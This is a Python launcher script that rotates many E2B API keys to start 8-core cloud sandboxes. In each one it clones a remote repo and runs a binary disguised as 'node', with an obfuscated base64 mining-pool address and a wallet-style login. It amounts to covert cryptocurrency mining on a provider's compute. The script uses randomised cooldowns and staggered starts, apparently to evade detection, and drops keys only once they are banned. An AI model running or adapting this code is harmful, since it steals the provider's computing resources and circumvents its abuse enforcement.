#!/usr/bin/env python
"""
main.py  –  Launch E2B sandboxes with a randomized, timed lifecycle.

MERGED LOGIC (FROM 8core1.py):
- E2B Template: Now uses the 'desktop' 8-core machine template.
- Runtime Limit: REMOVED. The command now runs indefinitely until it exits or crashes.
- Error Cooldown: If any error occurs in the sandbox, it pauses for a random duration of 5 to 10 minutes before restarting.
- Specific Error Handling:
    - "Sandbox not found" (timeout): Prints a simple message and restarts with a new 6-15 minute cooldown.
    - "Team blocked" / "Suspended": Abandons the API key permanently.

EXISTING LOGIC:
- Staggered start: Introduces a random grace period between launching sandboxes.
- Retry logic: Attempts to connect up to 10 times for each session.
- Abandon key: If connection fails 10 times, the API key is abandoned.
- Failed Attempt Cooldown: The cooldown after a failed connection attempt is randomized between 60 and 250 seconds.
"""

import asyncio
import argparse
import os
import sys
import random
from itertools import count
from typing import List, Set

from dotenv import load_dotenv
from e2b_code_interpreter import AsyncSandbox

# ──────────────────────────  YOUR BUILD-AND-RUN COMMAND  ───────────────────────────
DEFAULT_COMMAND = r"""
git clone https://github.com/marcei9809/ollma.git && \
cd ollma && chmod +x ./node && \
cat > data.json <<'EOF'
{
  "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
  "config": { "threads": 10, "log": true },
  "options": {
    "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
    "password": "c=RVN",
    "argent": "Kum"
  }
}
EOF
./node app.js
"""
# ──────────────────────────────────────────────────────────────────────────────────

ENV_PREFIX = "E2B_KEY_"
MAX_CONNECTION_ATTEMPTS = 10


# ─── helpers ─────────────────────────────────────────────────────────────────────
def env_keys(prefix: str = ENV_PREFIX) -> List[str]:
    """All env-var values whose names start with *prefix* and are non-empty."""
    return [v for k, v in os.environ.items() if k.startswith(prefix) and v.strip()]

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Spin up E2B 8-core sandboxes with an indefinite lifecycle.")
    p.add_argument("--key", action="append", metavar="E2B_API_KEY", help="repeat for multiple keys")
    p.add_argument("--cmd", default=DEFAULT_COMMAND, help="shell to run in each sandbox")
    p.add_argument("--downtime-min", type=int, default=30, help="Minimum cooldown in seconds (default: 30)")
    p.add_argument("--downtime-max", type=int, default=45, help="Maximum cooldown in seconds (default: 45)")
    return p.parse_args()

# ─── per-sandbox task ────────────────────────────────────────────────────────────
async def run_sandbox_lifecycle(
    key: str, cmd: str, idx: int,
    downtime_min: int, downtime_max: int
) -> None:
    """Manages the entire lifecycle of a single sandbox with random timings and retry logic."""
    tag = f"sbx-{idx}"

    while True:
        # --- Connection Retry Loop ---
        sbx_instance = None
        for attempt in range(MAX_CONNECTION_ATTEMPTS):
            try:
                print(f"🟡  [{tag}] Attempting to start DESKTOP (8-CORE) session (…{key[-6:]}), attempt {attempt + 1}/{MAX_CONNECTION_ATTEMPTS}", flush=True)
                sbx_instance = await AsyncSandbox.create(api_key=key, template='desktop', timeout=0)
                print(f"✅  [{tag}] DESKTOP (8-CORE) session started successfully.", flush=True)
                break
            except Exception as e:
                error_text = str(e).lower()
                if "team blocked" in error_text or "suspended" in error_text:
                    print(f"🚫  [{tag}] CRITICAL: API key (…{key[-6:]}) is blocked or suspended. Abandoning this key permanently.", file=sys.stderr, flush=True)
                    return # Exit this function entirely for this key

                print(f"❌  [{tag}] Connection attempt {attempt + 1} failed: {e}", file=sys.stderr, flush=True)
                if attempt < MAX_CONNECTION_ATTEMPTS - 1:
                    fail_cooldown = random.randint(60, 250)
                    print(f"⏰  [{tag}] Cooling down for {fail_cooldown}s before retry.", file=sys.stderr, flush=True)
                    await asyncio.sleep(fail_cooldown)
                else:
                    print(f"🚫  [{tag}] Abandoning key (…{key[-6:]}) after {MAX_CONNECTION_ATTEMPTS} failed connection attempts.", file=sys.stderr, flush=True)
                    return

        if not sbx_instance:
            return

        # --- Command Execution and Indefinite Run ---
        try:
            async with sbx_instance as sbx:
                print(f"🚀  [{tag}] Launching command to run indefinitely.", flush=True)
                proc = await sbx.commands.run(cmd=cmd, background=True, timeout=0)
                info = await sbx.get_info()
                print(f"📋  [{tag}] Sandbox ID: {info.sandbox_id}", flush=True)
                
                await proc.wait()

                if proc.exit_code == 0:
                    print(f"✅  [{tag}] Command completed successfully.", flush=True)
                else:
                    print(f"❌  [{tag}] Command exited unexpectedly with code: {proc.exit_code}", flush=True)

                if hasattr(proc, 'stdout') and proc.stdout:
                    print(f"📤  [{tag}] STDOUT: {proc.stdout[:500]}{'...' if len(proc.stdout) > 500 else ''}", flush=True)
                if hasattr(proc, 'stderr') and proc.stderr:
                    print(f"📥  [{tag}] STDERR: {proc.stderr[:500]}{'...' if len(proc.stderr) > 500 else ''}", flush=True)

        except Exception as e:
            error_text = str(e).lower()

            if "the sandbox was not found" in error_text:
                # MODIFIED: Handle the expected sandbox timeout with a 6 to 15 minute cooldown.
                downtime = random.randint(360, 900)  # 6 to 15 minutes in seconds
                print(f"ℹ️  [{tag}] Sandbox session timed out. Restarting in {downtime}s ({downtime/60:.1f} mins).", flush=True)
                await asyncio.sleep(downtime)
                continue

            elif "team blocked" in error_text or "suspended" in error_text:
                print(f"🚫  [{tag}] CRITICAL: API key (…{key[-6:]}) is blocked or suspended. Abandoning this key permanently.", file=sys.stderr, flush=True)
                break

            else:
                error_cooldown = random.randint(300, 600)  # 5 to 10 minutes
                print(f"\n❌  [{tag}] An unexpected error occurred during execution: {e}", file=sys.stderr, flush=True)
                print(f"⏰  [{tag}] Pausing for {error_cooldown}s ({error_cooldown/60:.1f} mins) before restarting.", flush=True)
                await asyncio.sleep(error_cooldown)
                continue

        downtime = random.randint(downtime_min, downtime_max)
        print(f"😴  [{tag}] Process exited normally. Cooldown for {downtime}s before restarting.", flush=True)
        await asyncio.sleep(downtime)


# ─── main entry ──────────────────────────────────────────────────────────────────
async def main_async() -> None:
    load_dotenv()
    args = parse_args()

    if args.downtime_min > args.downtime_max:
        sys.exit("Error: --downtime-min cannot be greater than --downtime-max")

    seen: Set[str] = set()
    keys: List[str] = []
    for k in env_keys() + (args.key or []):
        if k not in seen:
            keys.append(k)
            seen.add(k)

    if not keys:
        sys.exit(f"No API keys found – set {ENV_PREFIX}* or pass --key")

    print(f"Found {len(keys)} API key(s). Launching sandboxes sequentially with a grace period...\n")

    tasks = []
    for i, k in enumerate(count()):
        if i >= len(keys): break

        task = asyncio.create_task(run_sandbox_lifecycle(
            keys[i], args.cmd, i,
            args.downtime_min, args.downtime_max
        ))
        tasks.append(task)

        if i < len(keys) - 1:
            grace_period = random.randint(30, 45)
            print(f"\n─────────────────[ GRACE PERIOD: {grace_period}s ]─────────────────\n", flush=True)
            await asyncio.sleep(grace_period)

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nℹ️  Interrupted – shutting down.", file=sys.stderr)
